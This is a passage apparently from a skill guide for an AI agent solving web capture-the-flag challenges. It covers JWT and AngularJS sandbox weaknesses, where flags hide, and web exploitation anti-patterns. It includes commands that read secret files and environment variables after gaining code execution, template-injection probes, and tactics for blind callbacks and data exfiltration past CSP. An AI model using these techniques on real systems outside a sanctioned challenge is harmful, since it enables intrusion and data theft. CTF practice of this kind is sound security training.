- **JWT libs**: many accept `alg:none` only if you pass `algorithms=['none']`; the classic bug is `decode` without `algorithms=` pinned, or trusting the header `alg`.
- **AngularJS <1.6** has a bypassable expression sandbox (`charAt`→`trim` override); 1.6+ removed it entirely.
- **Banner/version → CVE**: if a pinned dependency, reachable route, and affected version support a known issue, verify its preconditions locally or with the smallest live test. Choose this early when it is the cheapest discriminating hypothesis; a banner alone is not proof.

## Finding the flag
Flags sit behind the vuln: DB table/row (`flag`,`flags`,`secret`), a file (`/flag`, `/flag.txt`, app root, `/proc/self/environ`), an env var, an admin-only view, or a hidden DOM node / `data-*` attr. After RCE/LFI check `cat /flag*`, `env`, app config, DB. Match `../chal_desc.md`'s flag format before submitting. When a sink is confirmed, record it in `notes/VULN.md` (`sink: <route> param <x> → <class>`, with the measured primitive); park dead ends/POISON in `notes/NEXT.md`. Cross-category pivot: RCE→memory-corruption/seccomp `../../skills/pwn.md`, token math/custom MAC `../../skills/crypto.md`, contract frontend `../../skills/blockchain.md`.

## Web-specific anti-patterns
- Blind fuzzing before reading shipped source; driving a GUI proxy instead of scripting in `solver.py`.
- Treating a CVE name or a version banner as proof without checking reachability and the affected code path.
- Escalating on an unproven primitive; jumping to RCE before `{{7*7}}` reflects, or building an XSS chain before a marker `img.src` confirms your JS runs in the bot.
- Declaring a blind bug dead without an OOB callback — no reflection ≠ no vuln.
- Fighting CSP to exfil externally when a same-origin self-upload/store would leak it with zero egress.
